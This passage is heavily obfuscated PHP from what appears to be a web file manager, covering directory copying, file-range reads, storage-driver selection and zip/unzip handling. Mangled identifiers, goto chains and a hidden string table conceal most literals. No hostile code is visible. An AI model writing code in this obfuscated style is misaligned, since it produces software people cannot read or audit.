array($DÑ¨ĞÁ°¢[1005] => $a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[75]], $DÑ¨ĞÁ°¢[1006] => rtrim($Dº‚‚Ä¥, $DÑ¨ĞÁ°¢[8]) . $DÑ¨ĞÁ°¢[8] . $f‰‡ÏÒöêä, $DÑ¨ĞÁ°¢[1007] => $a¦Ü„Ñ¥ä®); } $Dá¶Ù´â¥ = array($DÑ¨ĞÁ°¢[167] => $dÙ—ÓöÅİœ, $DÑ¨ĞÁ°¢[76] => $aˆöª÷õ‡Ò); goto fâ»¥»Å »; fâ»¥»Å »: Hook::trigger($DÑ¨ĞÁ°¢[1008], $eäÒáßÆæ, $Dº‚‚Ä¥, $Dá¶Ù´â¥); foreach ($aˆöª÷õ‡Ò as $a¦Ü„Ñ¥ä®) { IO::mkdir($a¦Ü„Ñ¥ä®); } foreach ($dÙ—ÓöÅİœ as $a¦Ü„Ñ¥ä®) { IO::copy($a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[1005]], $a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[1006]], REPEAT_REPLACE); } goto E³×áéïé; a¦‹ÌãÈ“¨: $BÕ¾êŠ‚Â÷ = self::_listAll($eäÒáßÆæ); $d°×´Ô”·ª = self::_listAll($Dº‚‚Ä¥); $dÙ—ÓöÅİœ = array(); goto fß¼š­À; c‚ã¯ŠôÄ¿: $DÑ¨ĞÁ°¢ =& $_SERVER[í…¶]; if (!IO::exist($eäÒáßÆæ)) { return !1; } if (!IO::exist($Dº‚‚Ä¥)) { IO::mkdir($Dº‚‚Ä¥); } goto a¦‹ÌãÈ“¨; E³×áéïé: } private static function _listAll($b¦ù„³Š´¸) { $c¯­ŸÏ§ô =& $_SERVER[í…¶]; $b¦ù„³Š´¸ = KodIO::clear($b¦ù„³Š´¸); $e™Şè™Ò¥— = IO::listAll($b¦ù„³Š´¸); foreach ($e™Şè™Ò¥— as &$f¼ÁÆòø÷) { $FÉ­ñâ´‘† = substr($f¼ÁÆòø÷[$c¯­ŸÏ§ô[75]], strlen($b¦ù„³Š´¸)); $f¼ÁÆòø÷[$c¯­ŸÏ§ô[1009]] = trim($FÉ­ñâ´‘†, $c¯­ŸÏ§ô[8]); } return array_to_keyvalue($e™Şè™Ò¥—, $c¯­ŸÏ§ô[1009]); } public static function fileSubstr($cœğ˜²ˆ½„, $Bø­»ÒŒ§´, $EªßÁÖ‚æÇ = false) { goto CÇˆ÷ÑŠÅ ; CÇˆ÷ÑŠÅ : $bÔÉƒåĞ = self::driverMake($cœğ˜²ˆ½„); $fñ‘’À’¥ = $bÔÉƒåĞ->size($cœğ˜²ˆ½„); $bŠƒøğÁ§ = $Bø­»ÒŒ§´; goto BŠ¬Ñ‹»Á©; BğÆŒÖòÏ´: return $bÔÉƒåĞ->fileSubstr($cœğ˜²ˆ½„, $Bø­»ÒŒ§´, $EªßÁÖ‚æÇ); goto D¸˜ëù•Š; BçÔ®õÚ†ô: if ($Bø­»ÒŒ§´ + $EªßÁÖ‚æÇ > $fñ‘’À’¥) { $EªßÁÖ‚æÇ = $fñ‘’À’¥ - $Bø­»ÒŒ§´; } if ($EªßÁÖ‚æÇ <= 0) { return $_SERVER[í…¶][33]; } if ($Bø­»ÒŒ§´ < 0 || $Bø­»ÒŒ§´ >= $fñ‘’À’¥ || $EªßÁÖ‚æÇ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\122\145\x61\x64\x20\x65\162\162\157\x72\41\x20\163\164\x61\x72\164\x3d{$Bø­»ÒŒ§´}\x3b\x6c\x65\156\x67\164\x68\75{$EªßÁÖ‚æÇ}\x3b\40\163\151\172\x65\75{$fñ‘’À’¥}\73"); } goto BğÆŒÖòÏ´; BŠ¬Ñ‹»Á©: $eòó­ÇÑ™ƒ = $EªßÁÖ‚æÇ; if ($Bø­»ÒŒ§´ < 0) { $Bø­»ÒŒ§´ = $fñ‘’À’¥ + $Bø­»ÒŒ§´; } if ($EªßÁÖ‚æÇ === !1) { $EªßÁÖ‚æÇ = $fñ‘’À’¥ - $Bø­»ÒŒ§´; } goto BçÔ®õÚ†ô; D¸˜ëù•Š: } private static function driverMake(&$e¶šÃ¦ó–‘) { goto AØÆÛ¦ãİ•; F°Ÿ¦×‹‘’: if ($bš Ó§‘ ‘[$d©£Ø‰¥[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bš Ó§‘ ‘[$d©£Ø‰¥[376]]]) { return !1; } $e¶šÃ¦ó–‘ = $bš Ó§‘ ‘[$d©£Ø‰¥[1010]]; $E¤¨—îæø = self::driverGet($bš Ó§‘ ‘, $e¶šÃ¦ó–‘); goto c®İ“ÈÏÒŸ; AØÆÛ¦ãİ•: $d©£Ø‰¥ =& $_SERVER[í…¶]; $bš Ó§‘ ‘ = KodIO::parse($e¶šÃ¦ó–‘); if (!self::$driverListSystem) { $aˆŒß¾„º = Model($d©£Ø‰¥[706])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($aˆŒß¾„º, $d©£Ø‰¥[376]); } goto F°Ÿ¦×‹‘’; c®İ“ÈÏÒŸ: return $E¤¨—îæø; goto CÛ°Ê˜ÃŸ; CÛ°Ê˜ÃŸ: } private static function driverGet($bÄ£—æ‰¸Î, &$dÑÔâ‹£) { goto aš¹Š“Û”÷; cä°ŠîÄ‘ğ: $fÙÑ³ Æ“µ->path = $dÑÔâ‹£; return $fÙÑ³ Æ“µ; goto E°¦Şïâòø; dŠœ‰­ğ¥Ä: if (isset($C„Ñ¸¹ƒ[$dÁÕããÛºÈ[6]][$dÁÕããÛºÈ[1022]])) { $fÙÑ³ Æ“µ->pathBase = rtrim($C„Ñ¸¹ƒ[$dÁÕããÛºÈ[6]][$dÁÕããÛºÈ[1022]], $dÁÕããÛºÈ[8]) . $dÁÕããÛºÈ[8]; $dÑÔâ‹£ = $fÙÑ³ Æ“µ->pathBase . ltrim($dÑÔâ‹£, $dÁÕããÛºÈ[8]); } $dÑÔâ‹£ = $fÙÑ³ Æ“µ->getPath($dÑÔâ‹£); if (isset($bÄ£—æ‰¸Î[$dÁÕããÛºÈ[996]])) { $dÑÔâ‹£ = $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[996]]; } goto cä°ŠîÄ‘ğ; aš¹Š“Û”÷: $dÁÕããÛºÈ =& $_SERVER[í…¶]; $FÃ·ÁØÉèÇ = $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[1011]]; $a•Ü©‹†˜Ü = $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[376]]; goto f¢‰…”Óó; f¢‰…”Óó: switch ($bÄ£—æ‰¸Î[$dÁÕããÛºÈ[29]]) { case KodIO::KOD_IO: $C„Ñ¸¹ƒ = self::$driverListSystem[$a•Ü©‹†˜Ü]; break; case KodIO::KOD_SOURCE: $dÑÔâ‹£ = $a•Ü©‹†˜Ü . $dÑÔâ‹£; $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1013], $dÁÕããÛºÈ[6] => $bÄ£—æ‰¸Î); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cÜ¼êàÕÌÆ = $GLOBALS[$dÁÕããÛºÈ[1014]]; self::$driverListUser = array_to_keyvalue($cÜ¼êàÕÌÆ, $dÁÕããÛºÈ[376]); } $C„Ñ¸¹ƒ = self::$driverListUser[$a•Ü©‹†˜Ü]; break; case KodIO::KOD_SHARE_LINK: $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1015], $dÁÕããÛºÈ[6] => $bÄ£—æ‰¸Î); $E…àŠ²´Š‘ = Action($dÁÕããÛºÈ[1016])->sharePathInfo($bÄ£—æ‰¸Î[$dÁÕããÛºÈ[75]]); $dÑÔâ‹£ = $E…àŠ²´Š‘[$dÁÕããÛºÈ[378]]; if (!$E…àŠ²´Š‘[$dÁÕããÛºÈ[378]]) { $EŒÛå‘áôÖ = Model($dÁÕããÛºÈ[545])->getInfo($E…àŠ²´Š‘[$dÁÕããÛºÈ[450]]); $dÑÔâ‹£ = KodIO::clear($EŒÛå‘áôÖ[$dÁÕããÛºÈ[1017]] . $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[1010]]); $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[448]] = $EŒÛå‘áôÖ; $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[996]] = $dÑÔâ‹£; $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1018], $dÁÕããÛºÈ[6] => $bÄ£—æ‰¸Î); } break; case KodIO::KOD_SHARE_ITEM: $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1019], $dÁÕããÛºÈ[6] => $bÄ£—æ‰¸Î); $EŒÛå‘áôÖ = Model($dÁÕããÛºÈ[545])->getInfo($bÄ£—æ‰¸Î[$dÁÕããÛºÈ[376]]); if ($EŒÛå‘áôÖ[$dÁÕããÛºÈ[378]] == $dÁÕããÛºÈ[477]) { $dÑÔâ‹£ = KodIO::clear($EŒÛå‘áôÖ[$dÁÕããÛºÈ[1017]] . $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[1010]]); $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[448]] = $EŒÛå‘áôÖ; $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[996]] = $dÑÔâ‹£; $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1020], $dÁÕããÛºÈ[6] => $bÄ£—æ‰¸Î); } else { if (!$dÑÔâ‹£) { $dÑÔâ‹£ = $EŒÛå‘áôÖ[$dÁÕããÛºÈ[378]]; } } break; default: $dÑÔâ‹£ = $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[75]]; $C„Ñ¸¹ƒ = array($dÁÕããÛºÈ[1012] => $dÁÕããÛºÈ[1021]); break; } $dƒŒù´›ğÈ = $bÄ£—æ‰¸Î[$dÁÕããÛºÈ[75]]; if (!isset(self::$driverCache[$dƒŒù´›ğÈ])) { $cÀ„¥±øö· = strtolower($C„Ñ¸¹ƒ[$dÁÕããÛºÈ[90]]); $AÈ³ÅÑ˜š« = $GLOBALS[$dÁÕããÛºÈ[6]][$dÁÕããÛºÈ[84]][$dÁÕããÛºÈ[756]]; $cÖãİ¨Ëåƒ = $dÁÕããÛºÈ[71] . (isset($AÈ³ÅÑ˜š«[$cÀ„¥±øö·]) ? $AÈ³ÅÑ˜š«[$cÀ„¥±øö·] : ucfirst($cÀ„¥±øö·)); if (!class_exists($cÖãİ¨Ëåƒ)) { show_json("{$cÖãİ¨Ëåƒ}\x20\156\157\x74\x20\145\170\151\163\x74\163\x21", !1); } $Bè…—×îŞÃ = isset($C„Ñ¸¹ƒ[$dÁÕããÛºÈ[6]]) ? $C„Ñ¸¹ƒ[$dÁÕããÛºÈ[6]] : !1; self::$driverCache[$dƒŒù´›ğÈ] = new $cÖãİ¨Ëåƒ($Bè…—×îŞÃ); } goto dËÄğêÎ˜; dËÄğêÎ˜: $fÙÑ³ Æ“µ = self::$driverCache[$dƒŒù´›ğÈ]; $fÙÑ³ Æ“µ->pathDriver = $FÃ·ÁØÉèÇ; $fÙÑ³ Æ“µ->pathBase = $dÁÕããÛºÈ[33]; goto dŠœ‰­ğ¥Ä; E°¦Şïâòø: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $cš˜ÑëËòµ; if (!$cš˜ÑëËòµ) { $C¡ÃœëÈïÅ = IO::init($_SERVER[í…¶][8]); } return $C¡ÃœëÈïÅ; } private static function iconvSystem($BÛ®ß«¬ÑÂ) { return self::local()->iconvSystem($BÛ®ß«¬ÑÂ); } private static function iconvApp($D²ĞóâÕ) { return self::local()->iconvApp($D²ĞóâÕ); } public static function zip($b¦ƒôƒëŸÜ, $aóÀœƒ¦ø = "\x7a\x69\x70", $F›Ì¤¿Ò²¨ = '', $E’¾Ä»Õ±ë = REPEAT_RENAME) { goto dÑÏè×Ğ’Ü; dÑÏè×Ğ’Ü: $Fá´ Ã˜¶Ÿ =& $_SERVER[í…¶]; $c¹…ŠîŒ«ô = self::init($b¦ƒôƒëŸÜ[0][$Fá´ Ã˜¶Ÿ[75]]); $F‹¶˜â°© = self::info($b¦ƒôƒëŸÜ[0][$Fá´ Ã˜¶Ÿ[75]]); goto FÍÈ´ˆ“³Õ; e“£ãñ½÷‰: if (count($a à²ê»î) > 1) { $féÆ¦ùß = IO::info(IO::pathFather($F‹¶˜â°©[$Fá´ Ã˜¶Ÿ[75]])); $EÊœÑÙ•ñä = $féÆ¦ùß[$Fá´ Ã˜¶Ÿ[28]]; } $f‚£ÅòêİŠ = $c÷È­ÇË¦‹; if (!$f‚£ÅòêİŠ) { $f‚£ÅòêİŠ = get_path_father($F‹¶˜â°©[$Fá´ Ã˜¶Ÿ[75]]); $E•¸è‰Š’˜ = IO::info($f‚£ÅòêİŠ); if (!$E•¸è‰Š’˜[$Fá´ Ã˜¶Ÿ[189]]) { show_json(LNG($Fá´ Ã˜¶Ÿ[1024]), !1); } } goto b×˜æ¹Äºà; Eé»ÊÚ…¤: foreach ($a à²ê»î as $Eæ­ÔåçÈÛ => $fî×¶‚äÃ…) { $a à²ê»î[$Eæ­ÔåçÈÛ] = self::iconvSystem($fî×¶‚äÃ…); } KodArchive::create($f“¡ÛÃ†Ğ, $a à²ê»î); if (!IO::exist($Cê£ÃŒ†ğÇ)) { if ($c÷È­ÇË¦‹) { del_dir($c÷È­ÇË¦‹); } show_json(LNG($Fá´ Ã˜¶Ÿ[1025]), !1); } goto F±ßŒ‹±‰ö; bë’ŒåŸ‡à: if (!$aˆòÁÓÕê¬) { del_dir($c÷È­ÇË¦‹); show_json(LNG($Fá´ Ã˜¶Ÿ[1025]), !1); } del_dir($c÷È­ÇË¦‹); return $aˆòÁÓÕê¬; goto D·î”‘‰«Ú; F±ßŒ‹±‰ö: if ($F›Ì¤¿Ò²¨ || !$c÷È­ÇË¦‹) { if ($c÷È­ÇË¦‹ && strstr($c÷È­ÇË¦‹, TEMP_FILES)) { $AâùòèÔ¢× = $a à²ê»î = array(); recursion_dir($f‚£ÅòêİŠ, $AâùòèÔ¢×, $a à²ê»î, 0); foreach ($AâùòèÔ¢× as $B«¿ÉºŠÙ) { del_dir($B«¿ÉºŠÙ); } foreach ($a à²ê»î as $f¹Ş®±©ÓÉ) { if ($f¹Ş®±©ÓÉ == $f“¡ÛÃ†Ğ) { continue; } del_file($f¹Ş®±©ÓÉ); } } return $Cê£ÃŒ†ğÇ; } $eôÊ“ ÒÏ = self::pathFather($F‹¶˜â°©[$Fá´ Ã˜¶Ÿ[75]]); $aˆòÁÓÕê¬ = self::move($Cê£ÃŒ†ğÇ, $eôÊ“ ÒÏ, $E’¾Ä»Õ±ë); goto bë’ŒåŸ‡à; FÍÈ´ˆ“³Õ: $c÷È­ÇË¦‹ = !1; if (!$F›Ì¤¿Ò²¨ && $c¹…ŠîŒ«ô->getType() == $Fá´ Ã˜¶Ÿ[102]) { $a à²ê»î = self::zipFileList($b¦ƒôƒëŸÜ); } else { $c÷È­ÇË¦‹ = $F›Ì¤¿Ò²¨ ? $F›Ì¤¿Ò²¨ : TEMP_FILES . $Fá´ Ã˜¶Ÿ[1023] . time() . rand_string(8) . $Fá´ Ã˜¶Ÿ[8]; mk_dir($c÷È­ÇË¦‹); $a à²ê»î = self::zipFileList($b¦ƒôƒëŸÜ, $c÷È­ÇË¦‹); } $EÊœÑÙ•ñä = $F‹¶˜â°©[$Fá´ Ã˜¶Ÿ[28]]; goto e“£ãñ½÷‰; b×˜æ¹Äºà: $Cê£ÃŒ†ğÇ = $f‚£ÅòêİŠ . $EÊœÑÙ•ñä . $Fá´ Ã˜¶Ÿ[91] . $aóÀœƒ¦ø; $Cê£ÃŒ†ğÇ = get_filename_auto($Cê£ÃŒ†ğÇ, $Fá´ Ã˜¶Ÿ[33], $E’¾Ä»Õ±ë); $f“¡ÛÃ†Ğ = self::iconvSystem($Cê£ÃŒ†ğÇ); goto Eé»ÊÚ…¤; D·î”‘‰«Ú: } public static function unzip($cœ‡ÌÙËëÏ, $FæˆŸÈÖ’œ = "\162\145\x70\x6c\141\143\x65") { goto eêŠòœğ´†; d£°Ãæï†´: foreach ($B¹†¢½Ú† as $Dè«È•›‚) { $Dè«È•›‚ = self::iconvApp($Dè«È•›‚); self::move($Dè«È•›‚, $B¸›ƒë°µ˜, $FæˆŸÈÖ’œ); } del_dir($AâŸ× ›ËÌ); if (!$eŒƒìÉÁÓÁ) { del_file($bºò±¢¿Ó); } goto aÊœ‡®†òƒ; aÊœ‡®†òƒ: return !0; goto E±ˆ½ƒä˜; cÆßÅ»‚Š®: $bŒÁí•ñÖ = KodArchive::extract($bºò±¢¿Ó, $AâŸ× ›ËÌ . $A¦„Ì™®Û[8], $a§Œ©òœÆ›); self::archiveExt(); if (!$bŒÁí•ñÖ[$A¦„Ì™®Û[1030]]) { show_json($A¦„Ì™®Û[1031] . $bŒÁí•ñÖ[$A¦„Ì™®Û[1032]], !1); } goto Aİã•‰¸ƒà; d±¯†÷„‡”: if (!@file_exists(self::iconvSystem($bºò±¢¿Ó))) { $eŒƒìÉÁÓÁ = self::localFilePath($e‰‘­ôµŠ¹, $BÛ¬‚ŠˆŒ²); $bºò±¢¿Ó = $eŒƒìÉÁÓÁ ? $eŒƒìÉÁÓÁ : parent::download($e‰‘­ôµŠ¹, $bºò±¢¿Ó); } $bºò±¢¿Ó = self::iconvSystem($bºò±¢¿Ó); $a§Œ©òœÆ› = isset($cœ‡ÌÙËëÏ[$A¦„Ì™®Û[1028]]) ? $cœ‡ÌÙËëÏ[$A¦„Ì™®Û[1028]] : $A¦„Ì™®Û[1029]; goto cÆßÅ»‚Š®; B¤‰¤Ö£¡ù: if (!($f£¹±ïÎÔ­ = parent::info($e‰‘­ôµŠ¹))) { show_json(LNG($A¦„Ì™®Û[1027]), !1); } if (!($BÆÚÆèà¶  = parent::infoFull($B¸›ƒë°µ˜))) { $B¸›ƒë°µ˜ = parent::mkdir($B¸›ƒë°µ˜); $BÆÚÆèà¶  = array($A¦„Ì™®Û[75] => $B¸›ƒë°µ˜); } else { if (isset($BÆÚÆèà¶ [$A¦„Ì™®Û[378]]) && trim($BÆÚÆèà¶ [$A¦„Ì™®Û[75]], $A¦„Ì™®Û[8]) != trim($B¸›ƒë°µ˜, $A¦„Ì™®Û[8])) { $EáÂñºõ›Ÿ = KodIO::make($BÆÚÆèà¶ [$A¦„Ì™®Û[470]]); $c‘š»ÈŒ• = parent::fileNameAuto($EáÂñºõ›Ÿ, $BÆÚÆèà¶ [$A¦„Ì™®Û[28]], REPEAT_RENAME_FOLDER, !0); $B¸›ƒë°µ˜ = parent::mkdir($EáÂñºõ›Ÿ . $c‘š»ÈŒ•); $BÆÚÆèà¶  = array($A¦„Ì™®Û[75] => $B¸›ƒë°µ˜); } } $B¸›ƒë°µ˜ = $BÆÚÆèà¶ [$A¦„Ì™®Û[75]]; goto cÕÄª‹†“Æ; cÕÄª‹†“Æ: $CÑäÖÎ´¿˜ = self::tmpFileName($f£¹±ïÎÔ­); $AâŸ× ›ËÌ = TEMP_FILES . $CÑäÖÎ´¿˜; del_dir($AâŸ× ›ËÌ); goto cÁ½ÃÏîõè; Aİã•‰¸ƒà: Hook::trigger($A¦„Ì™®Û[1033], $AâŸ× ›ËÌ); recursion_dir($AâŸ× ›ËÌ, $Bò‘—è÷™Õ, $aËåõ‰ó‚, 0); $B¹†¢½Ú† = array_merge($Bò‘—è÷™Õ, $aËåõ‰ó‚); goto d£°Ãæï†´; cÁ½ÃÏîõè: mk_dir($AâŸ× ›ËÌ); $BÛ¬‚ŠˆŒ² = self::fileExt($f£¹±ïÎÔ­); $bºò±¢¿Ó = $AâŸ× ›ËÌ . $A¦„Ì™®Û[91] . $BÛ¬‚ŠˆŒ²; goto d±¯†÷„‡”; eêŠòœğ´†: $A¦„Ì™®Û =& $_SERVER[í…¶]; $e‰‘­ôµŠ¹ = $cœ‡ÌÙËëÏ[$A¦„Ì™®Û[75]]; $B¸›ƒë°µ˜ = $cœ‡ÌÙËëÏ[$A¦„Ì™®Û[1026]]; goto B¤‰¤Ö£¡ù; E±ˆ½ƒä˜: } public static function unzipList($aÆÄêÙŠ•ƒ) { goto cÖ½‹ø×·À; aÈ‰‹ì©ª‚: $cÒÔá† Ë” = 50000; if (request_url_safe($D•ŠÃ ä)) { $D‘…¬ª‰Ã = parse_url_query($D•ŠÃ ä); if (!isset($D‘…¬ª‰Ã[$DíëæŠ³Ë¢[75]])) { show_json($DíëæŠ³Ë¢[1035], !1); } } $bŠÎˆùˆÊÇ = isset($D‘…¬ª‰Ã) ? $D‘…¬ª‰Ã[$DíëæŠ³Ë¢[75]] : $D•ŠÃ ä; goto f„› §ÊŸÔ; bÄ²·‰‚ƒ: self::archiveExt(); del_dir($eŞ÷µµ‹¡Ò); if (!$c—–‰÷Â•é[$DíëæŠ³Ë¢[1030]]) { show_json($c—–‰÷Â•é[$DíëæŠ³Ë¢[1032]], !1); } goto DÌÓ™Ôó‹Æ; aãĞôÃ°Œ: if (isset($D‘…¬ª‰Ã)) { $cÖ×äÀŒ¤™ = array($D‘…¬ª‰Ã[$DíëæŠ³Ë¢[75]], $D‘…¬ª‰Ã[$DíëæŠ³Ë¢[1034]], $D‘…¬ª‰Ã[$DíëæŠ³Ë¢[28]]); $D™¾ŒŞÛõ = md5(implode($DíëæŠ³Ë¢[70], $cÖ×äÀŒ¤™)) . $DíëæŠ³Ë¢[91] . get_path_ext($D‘…¬ª‰Ã[$DíëæŠ³Ë¢[28]]); } else { $cÖ×äÀŒ¤™ = array($eó‚òôÆ©[$DíëæŠ³Ë¢[28]], $eó‚òôÆ©[$DíëæŠ³Ë¢[75]], $eó‚òôÆ©[$DíëæŠ³Ë¢[77]]); $D™¾ŒŞÛõ = md5(implode($DíëæŠ³Ë¢[70], $cÖ×äÀŒ¤™)) . $DíëæŠ³Ë¢[91] . $FØªáŸ £Ú; } if ($B‹ÛÕÀÉğÑ == -1) { $Eç£Ç´æš = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\x65\167\x2f{$böÁ´¼‚®}\57{$D™¾ŒŞÛõ}\56\x6c\x6f\147"; $aÜÛ«ƒÓÇ = self::infoFull($Eç£Ç´æš); if ($aÜÛ«ƒÓÇ) { $Eç£Ç´æš = $aÜÛ«ƒÓÇ[$DíëæŠ³Ë¢[75]]; $BÄê²¦‚¨ = self::getContent($Eç£Ç´æš); if ($BÄê²¦‚¨) { $Dæ¤Ûšä¤Œ = json_decode($BÄê²¦‚¨, !0); if (count($Dæ¤Ûšä¤Œ) >= $cÒÔá† Ë”) { show_json(sprintf(LNG($DíëæŠ³Ë¢[1036]), count($Dæ¤Ûšä¤Œ)), !1); } return $Dæ¤Ûšä¤Œ; } } else { $Eç£Ç´æš = self::mkfile($Eç£Ç´æš); } } $eŞ÷µµ‹¡Ò = TEMP_FILES . $böÁ´¼‚®; goto C‰ŠÃ; f„› §ÊŸÔ: $eó‚òôÆ© = self::info($bŠÎˆùˆÊÇ); $FØªáŸ £Ú = self::fileExt($eó‚òôÆ©); $böÁ´¼‚® = self::tmpFileName($eó‚òôÆ©); goto aãĞôÃ°Œ; DÌÓ™Ôó‹Æ: $Dæ¤Ûšä¤Œ = json_encode($c—–‰÷Â•é[$DíëæŠ³Ë¢[1032]]); self::setContent($Eç£Ç´æš, $Dæ¤Ûšä¤Œ); if (count($c—–‰÷Â•é[$DíëæŠ³Ë¢[1032]]) >= $cÒÔá† Ë”) { show_json(sprintf(LNG($DíëæŠ³Ë¢[1036]), count($c—–‰÷Â•é[$DíëæŠ³Ë¢[1032]])), !1); } goto dØøëÂÈ«²; F§—ÇßƒÃ: $DöÓÃº½Ø = self::iconvSystem($DöÓÃº½Ø); if ($B‹ÛÕÀÉğÑ >= 0) { $BÆá‡¡†ô• = isset($aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[1038]]) ? $aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[1038]] : !1; $e±‰è×¶Ø¹ = isset($aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[28]]) ? $aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[28]] : $DíëæŠ³Ë¢[33]; KodArchive::filePreview($DöÓÃº½Ø, $B‹ÛÕÀÉğÑ, $BÆá‡¡†ô•, $e±‰è×¶Ø¹); self::archiveExt(); die; } $c—–‰÷Â•é = KodArchive::listContent($DöÓÃº½Ø); goto bÄ²·‰‚ƒ; C‰ŠÃ: if (!is_dir($eŞ÷µµ‹¡Ò)) { mk_dir($eŞ÷µµ‹¡Ò); } $DöÓÃº½Ø = $eŞ÷µµ‹¡Ò . $DíëæŠ³Ë¢[8] . $D™¾ŒŞÛõ; if (!@file_exists(self::iconvSystem($DöÓÃº½Ø))) { if (isset($D‘…¬ª‰Ã)) { url_request($D•ŠÃ ä, $DíëæŠ³Ë¢[1037], $DöÓÃº½Ø); } else { $a¥«¯´ºÒ = self::localFilePath($D•ŠÃ ä, $FØªáŸ £Ú); $DöÓÃº½Ø = $a¥«¯´ºÒ ? $a¥«¯´ºÒ : self::download($D•ŠÃ ä, $DöÓÃº½Ø); } } goto F§—ÇßƒÃ; dØøëÂÈ«²: return $c—–‰÷Â•é[$DíëæŠ³Ë¢[1032]]; goto c–¹®¶’İî; cÖ½‹ø×·À: $DíëæŠ³Ë¢ =& $_SERVER[í…¶]; $D•ŠÃ ä = $aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[75]]; $B‹ÛÕÀÉğÑ = isset($aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[1034]]) ? $aÆÄêÙŠ•ƒ[$DíëæŠ³Ë¢[1034]] : -1; goto aÈ‰‹ì©ª‚; c–¹®¶’İî: } private static function fileExt($f÷Šõ¹Ÿ“) { $B´¿Ç³º’• =& $_SERVER[í…¶]; $EË©«©ÍßŒ = $f÷Šõ¹Ÿ“[$B´¿Ç³º’•[160]]; if ($EË©«©ÍßŒ == $B´¿Ç³º’•[1039]) { $EªŒ»²³†® = $B´¿Ç³º’•[1040]; if (substr($f÷Šõ¹Ÿ“[$B´¿Ç³º’•[28]], -strlen($EªŒ»²³†®)) == $EªŒ»²³†®) { $EË©«©ÍßŒ = $B´¿Ç³º’•[1041]; } } self::archiveExt($EË©«©ÍßŒ); return $EË©«©ÍßŒ; } private static function zipFileList($a¾……Ì‚ñ, $FÎ†¼±¯Ú = false) { $a–ÉÌŠ®Šæ =& $_SERVER[í…¶]; $fÂÊÓÇ¾Ø = array(); foreach ($a¾……Ì‚ñ as $aÉĞ¬«Ÿ¶ï) { $BƒĞ½çºêˆ = $aÉĞ¬«Ÿ¶ï[$a–ÉÌŠ®Šæ[75]]; if ($FÎ†¼±¯Ú) { $BƒĞ½çºêˆ = self::copy($aÉĞ¬«Ÿ¶ï[$a–ÉÌŠ®Šæ[75]], $FÎ†¼±¯Ú, $a–ÉÌŠ®Šæ[747]); } if ($BƒĞ½çºêˆ && self::local()->exist($BƒĞ½çºêˆ)) { $fÂÊÓÇ¾Ø[$aÉĞ¬«Ÿ¶ï[$a–ÉÌŠ®Šæ[75]]] = $BƒĞ½çºêˆ; } } if (!empty($fÂÊÓÇ¾Ø)) { return array_values($fÂÊÓÇ¾Ø); } show_json(LNG($a–ÉÌŠ®Šæ[1042]), !1); } public static function tmpFileName($B×¼™ƒÏø¾) { $a·ÃÉÛÏ =& $_SERVER[í…¶]; $c½ôİîà»… = array($B×¼™ƒÏø¾[$a·ÃÉÛÏ[28]], $B×¼™ƒÏø¾[$a·ÃÉÛÏ[75]], $B×¼™ƒÏø¾[$a·ÃÉÛÏ[77]], $B×¼™ƒÏø¾[$a·ÃÉÛÏ[468]]); return md5(implode($a·ÃÉÛÏ[70], $c½ôİîà»…)); } private static function localFilePath($Dà¨ƒ‹‚´, $cé’øôÁËƒ) { goto c¦óÓ·Ê¼™; EÒ†ê´ÁÂÖ: if ($f”Í¿•ãÕ[$f”Ñéïª“†[29]] == KodIO::KOD_SOURCE) { $DÂƒ¡ßæéƒ = Model($f”Ñéïª“†[755])->fileInfoGet(KodIO::sourceID($Dà¨ƒ‹‚´)); if (!$DÂƒ¡ßæéƒ[$f”Ñéïª“†[75]]) { show_json($f”Ñéïª“†[1045], !1); } $Dà¨ƒ‹‚´ = $DÂƒ¡ßæéƒ[$f”Ñéïª“†[75]]; } $cÃ¥¤àÄì¨ = self::init($Dà¨ƒ‹‚´); $bÍ¤ïœêÒ¨ = $cÃ¥¤àÄì¨->getType(); goto DÜ‚Ç­‘ÈÂ; DÜ‚Ç­‘ÈÂ: if ($bÍ¤ïœêÒ¨ == $f”Ñéïª“†[102] || $bÍ¤ïœêÒ¨ == $f”Ñéïª“†[1046]) { if (!$cÃ¥¤àÄì¨->exist($cÃ¥¤àÄì¨->path)) { show_json(LNG($f”Ñéïª“†[101]), !1); } return $cÃ¥¤àÄì¨->path; } return !1; goto bï›ª…; c¦óÓ·Ê¼™: $f”Ñéïª“† =& $_SERVER[í…¶]; if ($cé’øôÁËƒ == $f”Ñéïª“†[1043] && strtoupper(substr(PHP_OS, 0, 3)) == $f”Ñéïª“†[1044]) { return !1; } $f”Í¿•ãÕ = KodIO::parse($Dà¨ƒ‹‚´); goto EÒ†ê´ÁÂÖ; bï›ª…: } private static function archiveExt($eªñ©êøÃõ = '') { $GLOBALS[$_SERVER[í…¶][1047]] = $eªñ©êøÃõ; } } goto aµØ˜“»àä; EƒÖâ¦³‰: class UserTagModel extends ModelBaseLight { public $optionType = 